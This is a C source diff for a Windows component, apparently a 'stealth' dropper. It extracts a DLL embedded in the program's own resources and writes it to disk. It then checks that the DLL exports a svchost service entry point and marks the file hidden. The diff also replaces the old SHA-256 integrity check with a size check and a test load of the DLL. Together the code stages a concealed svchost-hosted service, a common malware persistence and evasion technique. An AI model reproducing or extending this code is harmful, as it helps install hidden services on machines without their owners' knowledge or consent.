@@ -1,26 +1,9 @@
 #include <windows.h>
 #include <stdint.h>
-#include <limits.h>
 #include <string.h>
 #include "svchost_payload.h"
 
 #if defined(BUILD_SVCHOST_DLL)
-
-const unsigned char* MeshSvchostPayload_GetData(size_t* length)
-{
-    if (length != NULL)
-    {
-        *length = 0;
-    }
-    SetLastError(ERROR_NOT_SUPPORTED);
-    return NULL;
-}
-
-BOOL MeshSvchostPayload_VerifyIntegrity(void)
-{
-    SetLastError(ERROR_NOT_SUPPORTED);
-    return FALSE;
-}
 
 BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 {
@@ -31,15 +14,15 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 
 #else
 
-#include "../microstack/ILibCrypto.h"
-#include "stealth.h"
-#include "meshcore/embedded/generated/svchost_payload.h"
 #include <strsafe.h>
+#include "stealth.h"
 
-#define SVCHOST_PAYLOAD_HASH_HEX_CHARS      (UTIL_SHA256_HASHSIZE * 2)
-#define SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH  (SVCHOST_PAYLOAD_HASH_HEX_CHARS + 1)
+#ifndef IDR_SVCHOST_DLL
+#define IDR_SVCHOST_DLL 101
+#endif
 
-#define STEALTH_CAPTURE_ENV_VAR          L"STEALTH_CAPTURE_FAILED_DLL"
+#define STEALTH_CAPTURE_ENV_VAR L"STEALTH_CAPTURE_FAILED_DLL"
+#define STEALTH_SVCHOST_EXPORT_NAME "Stealth_SvchostServiceMain"
 
 static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
 {
@@ -52,163 +35,111 @@ static void MeshSvchostPayload_SetHiddenAttributes(const wchar_t* path)
     SetFileAttributesW(path, attrs);
 }
 
-static BOOL MeshSvchostPayload_HashBufferHex(const unsigned char* data, size_t length, char* outHex, size_t outHexLength)
+static BOOL MeshSvchostPayload_GetEmbeddedResource(const void** resourceData, DWORD* resourceSize)
 {
-    if (data == NULL || length == 0 || outHex == NULL || outHexLength < SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH)
+    HMODULE moduleHandle = NULL;
+    HRSRC resourceInfo = NULL;
+    HGLOBAL resourceHandle = NULL;
+    const void* lockedResource = NULL;
+    DWORD lockedSize = 0;
+    LPCWSTR resourceType = MAKEINTRESOURCEW(10);
+
+    if (resourceData == NULL || resourceSize == NULL)
     {
         SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    unsigned char digest[UTIL_SHA256_HASHSIZE];
-    util_sha256((char*)data, length, (char*)digest);
-    util_tohex_lower((char*)digest, UTIL_SHA256_HASHSIZE, outHex);
+    *resourceData = NULL;
+    *resourceSize = 0;
+
+    moduleHandle = GetModuleHandleW(NULL);
+    if (moduleHandle == NULL)
+    {
+        return FALSE;
+    }
+
+    resourceInfo = FindResourceW(moduleHandle, MAKEINTRESOURCEW(IDR_SVCHOST_DLL), resourceType);
+    if (resourceInfo == NULL)
+    {
+        return FALSE;
+    }
+
+    resourceHandle = LoadResource(moduleHandle, resourceInfo);
+    if (resourceHandle == NULL)
+    {
+        return FALSE;
+    }
+
+    lockedResource = LockResource(resourceHandle);
+    lockedSize = SizeofResource(moduleHandle, resourceInfo);
+    if (lockedResource == NULL || lockedSize == 0)
+    {
+        SetLastError(ERROR_RESOURCE_DATA_NOT_FOUND);
+        return FALSE;
+    }
+
+    *resourceData = lockedResource;
+    *resourceSize = lockedSize;
     return TRUE;
 }
 
-static BOOL MeshSvchostPayload_HashFileHex(const wchar_t* path, char* outHex, size_t outHexLength)
+static BOOL MeshSvchostPayload_VerifyFileSize(const wchar_t* path, DWORD expectedSize)
 {
+    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
+    ULARGE_INTEGER actualSize;
+
     if (path == NULL || path[0] == L'\0')
     {
         SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    HANDLE fileHandle = CreateFileW(
-        path,
-        GENERIC_READ,
-        FILE_SHARE_READ | FILE_SHARE_DELETE,
-        NULL,
-        OPEN_EXISTING,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL);
-
-    if (fileHandle == INVALID_HANDLE_VALUE)
+    if (!GetFileAttributesExW(path, GetFileExInfoStandard, &fileInfo))
     {
         return FALSE;
     }
 
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(fileHandle, &fileSize))
+    actualSize.LowPart = fileInfo.nFileSizeLow;
+    actualSize.HighPart = fileInfo.nFileSizeHigh;
+    if (actualSize.QuadPart != (ULONGLONG)expectedSize)
     {
-        DWORD fileErr = GetLastError();
-        CloseHandle(fileHandle);
-        SetLastError(fileErr);
+        SetLastError(ERROR_BAD_LENGTH);
         return FALSE;
     }
 
-    ULONGLONG fileSizeValue = (fileSize.QuadPart < 0) ? 0 : (ULONGLONG)fileSize.QuadPart;
-    if (fileSizeValue == 0)
-    {
-        CloseHandle(fileHandle);
-        SetLastError(ERROR_INVALID_DATA);
-        return FALSE;
-    }
-
-    if (fileSizeValue != (ULONGLONG)g_SvchostPayload_SIZE)
-    {
-        CloseHandle(fileHandle);
-        SetLastError(ERROR_INVALID_DATA);
-        return FALSE;
-    }
-
-    if ((ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)SIZE_MAX ||
-        (ULONGLONG)g_SvchostPayload_SIZE > (ULONGLONG)MAXDWORD)
-    {
-        Stealth_LogInstallEvent(L"HashFileHex payload size exceeds runtime limits (size=%I64u, SIZE_MAX=%I64u, MAXDWORD=%u)",
-            (unsigned long long)g_SvchostPayload_SIZE,
-            (unsigned long long)((ULONGLONG)SIZE_MAX),
-            (unsigned int)MAXDWORD);
-        CloseHandle(fileHandle);
-        SetLastError(ERROR_FILE_TOO_LARGE);
-        return FALSE;
-    }
-
-    const size_t bytesToRead = (size_t)fileSizeValue;
-    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, bytesToRead);
-    if (buffer == NULL)
-    {
-        CloseHandle(fileHandle);
-        SetLastError(ERROR_OUTOFMEMORY);
-        return FALSE;
-    }
-
-    DWORD totalRead = 0;
-    BOOL readOk = ReadFile(fileHandle, buffer, (DWORD)bytesToRead, &totalRead, NULL);
-    DWORD readErr = readOk ? ERROR_SUCCESS : GetLastError();
-    CloseHandle(fileHandle);
-
-    if (!readOk || totalRead != bytesToRead)
-    {
-        HeapFree(GetProcessHeap(), 0, buffer);
-        if (readErr != ERROR_SUCCESS)
-        {
-            SetLastError(readErr);
-        }
-        else
-        {
-            SetLastError(ERROR_READ_FAULT);
-        }
-        return FALSE;
-    }
-
-    BOOL hashResult = MeshSvchostPayload_HashBufferHex(buffer, bytesToRead, outHex, outHexLength);
-    HeapFree(GetProcessHeap(), 0, buffer);
-    return hashResult;
+    return TRUE;
 }
 
-static BOOL MeshSvchostPayload_VerifyHashEquals(const char* expectedHex, const char* actualHex)
+static BOOL MeshSvchostPayload_VerifyWrittenDll(const wchar_t* path)
 {
-    if (expectedHex == NULL || actualHex == NULL)
+    HMODULE moduleHandle = NULL;
+    FARPROC serviceMain = NULL;
+    DWORD exportError = ERROR_SUCCESS;
+
+    if (path == NULL || path[0] == L'\0')
     {
         SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    if (_stricmp(expectedHex, actualHex) != 0)
+    moduleHandle = LoadLibraryExW(path, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (moduleHandle == NULL)
     {
-        SetLastError(ERROR_CRC);
         return FALSE;
     }
+
+    serviceMain = GetProcAddress(moduleHandle, STEALTH_SVCHOST_EXPORT_NAME);
+    exportError = (serviceMain != NULL) ? ERROR_SUCCESS : GetLastError();
+    FreeLibrary(moduleHandle);
+
+    if (serviceMain == NULL)
+    {
+        SetLastError(exportError != ERROR_SUCCESS ? exportError : ERROR_PROC_NOT_FOUND);
+        return FALSE;
+    }
+
     return TRUE;
-}
-
-static BOOL MeshSvchostPayload_VerifyFileOnDisk(const wchar_t* path)
-{
-    char fileHash[SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH] = {0};
-    if (!MeshSvchostPayload_HashFileHex(path, fileHash, sizeof(fileHash)))
-    {
-        return FALSE;
-    }
-    return MeshSvchostPayload_VerifyHashEquals(g_SvchostPayload_SHA256, fileHash);
-}
-
-const unsigned char* MeshSvchostPayload_GetData(size_t* length)
-{
-    if (length != NULL)
-    {
-        *length = (size_t)g_SvchostPayload_SIZE;
-    }
-    return g_SvchostPayload;
-}
-
-BOOL MeshSvchostPayload_VerifyIntegrity(void)
-{
-    size_t dataLength = 0;
-    const unsigned char* data = MeshSvchostPayload_GetData(&dataLength);
-    if (data == NULL || dataLength == 0)
-    {
-        SetLastError(ERROR_INVALID_DATA);
-        return FALSE;
-    }
-
-    char computed[SVCHOST_PAYLOAD_HASH_BUFFER_LENGTH] = {0};
-    if (!MeshSvchostPayload_HashBufferHex(data, dataLength, computed, sizeof(computed)))
-    {
-        return FALSE;
-    }
-
-    return MeshSvchostPayload_VerifyHashEquals(g_SvchostPayload_SHA256, computed);
 }
 
 static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
@@ -243,28 +174,26 @@ static void MeshSvchostPayload_TryCaptureFailure(const wchar_t* destination)
 
 BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 {
+    HANDLE fileHandle = INVALID_HANDLE_VALUE;
+    const void* payloadData = NULL;
+    DWORD payloadSize = 0;
+    DWORD written = 0;
+    BOOL writeOk = FALSE;
+
     if (destination == NULL || destination[0] == L'\0')
     {
         SetLastError(ERROR_INVALID_PARAMETER);
         return FALSE;
     }
 
-    if (!MeshSvchostPayload_VerifyIntegrity())
+    if (!MeshSvchostPayload_GetEmbeddedResource(&payloadData, &payloadSize))
     {
+        Stealth_LogInstallEvent(L"Failed to locate embedded svchost payload resource (error=%lu)", GetLastError());
         return FALSE;
     }
 
-    size_t dataLength = 0;
-    const unsigned char* data = MeshSvchostPayload_GetData(&dataLength);
-    if (data == NULL || dataLength == 0 || dataLength > MAXDWORD)
-    {
-        SetLastError(ERROR_INVALID_DATA);
-        return FALSE;
-    }
+    Stealth_LogInstallEvent(L"Emitting embedded svchost payload resource (%lu bytes) to %ls", payloadSize, destination);
 
-    Stealth_LogInstallEvent(L"Emitting embedded svchost payload (%Iu bytes) to %ls", dataLength, destination);
-
-    HANDLE fileHandle = INVALID_HANDLE_VALUE;
     {
         const DWORD startTick = GetTickCount();
         DWORD delay = 100;
@@ -272,7 +201,8 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
 
         for (;;)
         {
-            fileHandle = CreateFileW(destination,
+            fileHandle = CreateFileW(
+                destination,
                 GENERIC_WRITE,
                 0,
                 NULL,
@@ -307,38 +237,38 @@ BOOL MeshSvchostPayload_WriteToPath(const wchar_t* destination)
         }
     }
 
-    DWORD written = 0;
-    BOOL result = WriteFile(fileHandle, data, (DWORD)dataLength, &written, NULL);
-    DWORD writeErr = result ? ERROR_SUCCESS : GetLastError();
-    CloseHandle(fileHandle);
-
-    if (!result || written != dataLength)
+    writeOk = WriteFile(fileHandle, payloadData, payloadSize, &written, NULL);
+    if (writeOk)
     {
-        Stealth_LogInstallEvent(L"WriteFile failed for %ls (bytes=%lu, error=%lu)", destination, written, writeErr);
-        if (writeErr != ERROR_SUCCESS)
+        FlushFileBuffers(fileHandle);
+    }
+    {
+        DWORD writeErr = writeOk ? ERROR_SUCCESS : GetLastError();
+        CloseHandle(fileHandle);
+        fileHandle = INVALID_HANDLE_VALUE;
+
+        if (!writeOk || written != payloadSize)
         {
-            SetLastError(writeErr);
+            Stealth_LogInstallEvent(L"WriteFile failed for %ls (bytes=%lu, error=%lu)", destination, written, writeErr);
+            DeleteFileW(destination);
+            SetLastError(writeErr != ERROR_SUCCESS ? writeErr : ERROR_WRITE_FAULT);
+            return FALSE;
         }
-        DeleteFileW(destination);
-        return FALSE;
     }
 
-    if (!MeshSvchostPayload_VerifyFileOnDisk(destination))
+    if (!MeshSvchostPayload_VerifyFileSize(destination, payloadSize) ||
+        !MeshSvchostPayload_VerifyWrittenDll(destination))
     {
         DWORD verifyErr = GetLastError();
         Stealth_LogInstallEvent(L"Embedded svchost payload verification failed for %ls (error=%lu)", destination, verifyErr);
         Stealth_LogPathState(destination);
         MeshSvchostPayload_TryCaptureFailure(destination);
         DeleteFileW(destination);
-        if (verifyErr != ERROR_SUCCESS)
-        {
-            SetLastError(verifyErr);
-        }
+        SetLastError(verifyErr);
         return FALSE;
     }
 
-    Stealth_LogInstallEvent(L"Embedded svchost payload staged (%Iu bytes) to %ls", dataLength, destination);
-
+    Stealth_LogInstallEvent(L"Embedded svchost payload staged (%lu bytes) to %ls", payloadSize, destination);
     MeshSvchostPayload_SetHiddenAttributes(destination);
     return TRUE;
 }
